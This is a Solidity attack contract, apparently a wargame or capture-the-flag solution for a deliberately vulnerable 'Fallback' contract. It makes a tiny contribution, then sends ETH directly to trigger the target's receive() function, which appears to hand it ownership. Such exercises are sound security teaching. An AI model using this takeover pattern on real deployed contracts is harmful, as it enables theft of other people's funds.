pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function owner() external view returns (address);
}


contract AttackFallback {
    IFallback public instance;

    constructor(address _instance) {
        instance = IFallback(payable(_instance));
    }

    function attack() external payable {
        // Contribute a small amount to establish a valid contribution
        instance.contribute{value: 0.0001 ether}();
        // Then send additional ETH to target contract to trigger receive()
        (bool success, ) = address(instance).call{value: msg.value}("");
        require(success);
    }

    function checkOwner() external view returns (address) {
        return instance.owner();
    }

    receive() external payable {
        // Reuse contract's own receive function
        (bool success, ) = address(instance).call{value: msg.value}("");
        require(success);
    }
}
